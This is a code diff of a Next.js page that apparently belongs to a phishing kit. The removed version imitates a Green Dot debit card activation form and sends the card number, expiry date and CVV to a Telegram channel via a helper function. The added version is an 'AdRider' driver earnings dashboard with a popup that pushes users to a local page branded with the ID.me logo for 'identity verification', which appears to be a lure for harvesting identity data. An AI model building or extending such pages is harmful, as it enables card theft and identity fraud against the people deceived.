@@ -1,125 +1,247 @@
+/* eslint-disable @next/next/no-img-element */
 "use client";
-
-import React, { useState } from "react";
+import React, { useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
-import { sendTelegramMessage } from "../../utils/telegram";
 
-const ActivateCardPage: React.FC = () => {
-  const [cardNumber, setCardNumber] = useState("");
-  const [expirationDate, setExpirationDate] = useState("");
-  const [cvv, setCvv] = useState("");
-  const [error, setError] = useState("");
+const Spinner = ({ size = 'md' }: { size?: 'sm' | 'md' | 'lg' }) => (
+  <div className={`animate-spin rounded-full border-2 border-solid border-current border-r-transparent 
+    ${size === 'sm' ? 'h-4 w-4' : size === 'lg' ? 'h-12 w-12' : 'h-8 w-8'} inline-block`}>
+    <span className="sr-only">Loading...</span>
+  </div>
+);
+
+const VerificationPopup = ({ onClose }: { onClose: () => void }) => {
   const router = useRouter();
 
-  const isFormValid =
-    cardNumber.length === 16 && expirationDate && cvv.length === 3;
-
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-
-    if (!isFormValid) {
-      setError("Please complete all fields.");
-      return;
-    }
-
-    const message = `
-    🔔 *New Card Activation Request* 🔔
-    💳 Card Number: ${cardNumber}
-    📅 Expiration Date: ${expirationDate}
-    🔒 CVV: ${cvv}
-    `;
-
-    try {
-      await sendTelegramMessage(message);
-
-
-      setError(""); // Clear any existing errors
-    } catch (err) {
-      console.log(err)
-      setError("Failed to send the message. Please try again.");
-    }
-    router.push('/profile');
-  };
-
   return (
-    <div className="flex items-center justify-center min-h-screen bg-gray-100 px-4">
-      <div className="bg-white shadow-md rounded-lg p-6 w-full max-w-xl text-center border border-gray-300">
-        <h1 className="text-xl md:text-2xl lg:text-3xl font-semibold text-gray-900 tracking-tight font-sans">
-          You are seconds away from using your new
-          <span className="text-green-600"> Green Dot Debit Card!</span>
-        </h1>
-
-        <p className="text-gray-600 mt-2 text-sm md:text-base">
-          Please enter your cards information in the form below.
-        </p>
-
-        {error && (
-          <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-2 rounded mt-4 text-sm">
-            {error}
-          </div>
-        )}
-
-        <form onSubmit={handleSubmit} className="mt-6 space-y-4">
-          <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
-            <input
-              type="tel"
-              pattern="[0-9]*"
-              placeholder="16-digit card number"
-              value={cardNumber}
-              onChange={(e) =>
-                setCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16))
-              }
-              className="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-green-500 focus:border-green-500 text-sm"
-            />
-            <input
-              type="tel"
-              pattern="\d{2}/\d{2}"
-              placeholder="MM/YY"
-              value={expirationDate}
-              onChange={(e) => setExpirationDate(e.target.value)}
-              className="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-green-500 focus:border-green-500 text-sm"
-            />
-            <input
-              type="tel"
-              pattern="[0-9]{3}"
-              placeholder="CVV"
-              value={cvv}
-              onChange={(e) =>
-                setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))
-              }
-              className="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-green-500 focus:border-green-500 text-sm"
-            />
-          </div>
-
+    <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50">
+      <div className="bg-white p-8 rounded-xl shadow-xl max-w-md w-full mx-4">
+        <div className="text-center mb-6">
+          <img src="/idme-logo.svg" alt="ID.me" className="h-12 mx-auto mb-4" />
+          <h2 className="text-2xl font-bold text-gray-800 mb-2">Identity Verification Required</h2>
+          <p className="text-gray-600">
+            To participate in advertising campaigns, we need to verify your identity and 
+            vehicle ownership through our secure partner ID.me.
+          </p>
+        </div>
+        <div className="flex flex-col space-y-4">
           <button
-            type="submit"
-            className={`w-full py-2 rounded-lg text-white font-semibold transition duration-300 text-sm md:text-base ${
-              isFormValid
-                ? "bg-green-600 hover:bg-green-700"
-                : "bg-gray-300 cursor-not-allowed"
-            }`}
-            disabled={!isFormValid}
+            onClick={() => router.push("/idme")}
+            className="bg-blue-600 text-white py-3 rounded-lg font-medium hover:bg-blue-700 transition"
           >
-            Next
+            Verify Now
           </button>
-        </form>
-
-        {/* Disclaimer Text */}
-        <p className="text-[10px] text-gray-500 mt-6 leading-tight">
-          Green Dot Cards are issued by Green Dot Bank, Member FDIC, pursuant to
-          a license from Visa U.S.A., Inc. Visa is a registered trademark of
-          Visa International Service Association. Green Dot Bank also operates
-          under the following registered trade names:{" "}
-          <strong>GO2bank, GoBank,</strong> and{" "}
-          <strong>Bonneville Bank.</strong> These registered trade names are
-          used by, and refer to, a single FDIC-insured bank, Green Dot Bank.
-          Deposits under any of these trade names are deposits with Green Dot
-          Bank and are aggregated for deposit insurance coverage up to the
-          allowable limits.
-        </p>
+          <button
+            onClick={onClose}
+            className="text-gray-600 hover:text-gray-800 font-medium"
+          >
+            Remind Me Later
+          </button>
+        </div>
       </div>
     </div>
   );
 };
 
-export default ActivateCardPage;
+const DriverDashboard = () => {
+  const [driverData, setDriverData] = useState<any>(null);
+  const [loading, setLoading] = useState(true);
+  const [showVerifyPopup, setShowVerifyPopup] = useState(false);
+  const router = useRouter();
+
+  useEffect(() => {
+    const fetchDriverProfile = async () => {
+      try {
+        const userId = localStorage.getItem("userId");
+        if (!userId) return router.push("/login");
+        
+        const response = await fetch(`/api/drivers/${userId}`);
+        const data = await response.json();
+        
+        setDriverData(data);
+        if (!data.verified) setShowVerifyPopup(true);
+      } catch (error) {
+        console.error("Error fetching driver data:", error);
+      } finally {
+        setLoading(false);
+      }
+    };
+
+    fetchDriverProfile();
+  }, [router]);
+
+  const campaignStatusBadge = (status: string) => {
+    const statusStyles = {
+      active: "bg-green-100 text-green-800",
+      pending: "bg-yellow-100 text-yellow-800",
+      completed: "bg-blue-100 text-blue-800",
+    };
+    return (
+      <span className={`px-2 py-1 rounded-full text-sm ${statusStyles[status as keyof typeof statusStyles]}`}>
+        {status.toUpperCase()}
+      </span>
+    );
+  };
+
+  return (
+    <div className="min-h-screen bg-gray-50">
+      {showVerifyPopup && <VerificationPopup onClose={() => setShowVerifyPopup(false)} />}
+
+      {/* Navigation Header */}
+      <nav className="bg-white shadow-sm">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+          <div className="flex justify-between h-16 items-center">
+            <img src="/adrider-logo.svg" alt="AdRider" className="h-8" />
+            <div className="flex items-center space-x-4">
+              <button 
+                className="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700"
+                onClick={() => router.push("/campaigns/apply")}
+              >
+                Apply for Campaign
+              </button>
+              <div className="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center">
+                <span className="font-medium">{driverData?.firstName?.[0] || 'U'}</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav>
+
+      {/* Main Content */}
+      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
+        {/* Dashboard Header */}
+        <div className="mb-8">
+          <h1 className="text-3xl font-bold text-gray-900">
+            Welcome back, {driverData?.firstName || 'Driver'}!
+          </h1>
+          <p className="text-gray-600 mt-2">
+            Your vehicle is currently earning: ${driverData?.currentEarnings?.toFixed(2) || '0.00'} this month
+          </p>
+        </div>
+
+        {/* Stats Grid */}
+        {loading ? (
+          <div className="flex justify-center py-12">
+            <Spinner size="lg" />
+          </div>
+        ) : (
+          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
+            <div className="bg-white p-6 rounded-xl shadow-sm">
+              <div className="flex justify-between items-center">
+                <div>
+                  <p className="text-sm text-gray-600">Total Earnings</p>
+                  <p className="text-2xl font-bold mt-1">
+                    ${driverData?.totalEarnings?.toLocaleString() || '0.00'}
+                  </p>
+                </div>
+                <div className="bg-green-100 p-3 rounded-lg">💸</div>
+              </div>
+            </div>
+
+            <div className="bg-white p-6 rounded-xl shadow-sm">
+              <div className="flex justify-between items-center">
+                <div>
+                  <p className="text-sm text-gray-600">Available Balance</p>
+                  <p className="text-2xl font-bold mt-1">
+                    ${driverData?.availableBalance?.toLocaleString() || '0.00'}
+                  </p>
+                </div>
+                <div className="bg-blue-100 p-3 rounded-lg">🏦</div>
+              </div>
+            </div>
+
+            <div className="bg-white p-6 rounded-xl shadow-sm">
+              <div className="flex justify-between items-center">
+                <div>
+                  <p className="text-sm text-gray-600">Current Campaigns</p>
+                  <p className="text-2xl font-bold mt-1">
+                    {driverData?.currentCampaigns || 0}
+                  </p>
+                </div>
+                <div className="bg-purple-100 p-3 rounded-lg">🚗</div>
+              </div>
+            </div>
+
+            <div className="bg-white p-6 rounded-xl shadow-sm">
+              <div className="flex justify-between items-center">
+                <div>
+                  <p className="text-sm text-gray-600">Next Payment</p>
+                  <p className="text-2xl font-bold mt-1">
+                    {driverData?.nextPaymentDate || '--'}
+                  </p>
+                </div>
+                <div className="bg-yellow-100 p-3 rounded-lg">📅</div>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* Campaign Activity */}
+        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
+          <section className="bg-white p-6 rounded-xl shadow-sm">
+            <h3 className="text-lg font-semibold mb-4">Active Campaigns</h3>
+            <div className="space-y-4">
+              {driverData?.campaigns?.map((campaign: any) => (
+                <div key={campaign.id} className="p-4 border-b last:border-0 hover:bg-gray-50">
+                  <div className="flex justify-between items-center">
+                    <div>
+                      <h4 className="font-medium">{campaign.name}</h4>
+                      <p className="text-sm text-gray-600">{campaign.dates}</p>
+                    </div>
+                    <div className="text-right">
+                      <p className="font-medium">${campaign.earnings.toFixed(2)}</p>
+                      {campaignStatusBadge(campaign.status)}
+                    </div>
+                  </div>
+                </div>
+              ))}
+              <button 
+                className="w-full text-center text-blue-600 py-3 hover:bg-gray-50 rounded-lg"
+                onClick={() => router.push("/campaigns")}
+              >
+                View All Campaigns →
+              </button>
+            </div>
+          </section>
+
+          {/* Quick Actions */}
+          <section className="bg-white p-6 rounded-xl shadow-sm">
+            <h3 className="text-lg font-semibold mb-4">Driver Tools</h3>
+            <div className="grid grid-cols-2 gap-4">
+              <button
+                className="p-4 bg-blue-50 rounded-lg hover:bg-blue-100 transition"
+                onClick={() => router.push("/campaigns/apply")}
+              >
+                <div className="text-xl mb-2">📢</div>
+                <span className="font-medium">Apply for New Campaign</span>
+              </button>
+              <button
+                className="p-4 bg-green-50 rounded-lg hover:bg-green-100 transition"
+                onClick={() => router.push("/schedule")}
+              >
+                <div className="text-xl mb-2">🗓️</div>
+                <span className="font-medium">View Schedule</span>
+              </button>
+              <button
+                className="p-4 bg-purple-50 rounded-lg hover:bg-purple-100 transition"
+                onClick={() => router.push("/documents")}
+              >
+                <div className="text-xl mb-2">📁</div>
+                <span className="font-medium">Upload Documents</span>
+              </button>
+              <button
+                className="p-4 bg-yellow-50 rounded-lg hover:bg-yellow-100 transition"
+                onClick={() => router.push("/support")}
+              >
+                <div className="text-xl mb-2">🛟</div>
+                <span className="font-medium">Support Center</span>
+              </button>
+            </div>
+          </section>
+        </div>
+      </main>
+    </div>
+  );
+};
+
+export default DriverDashboard;
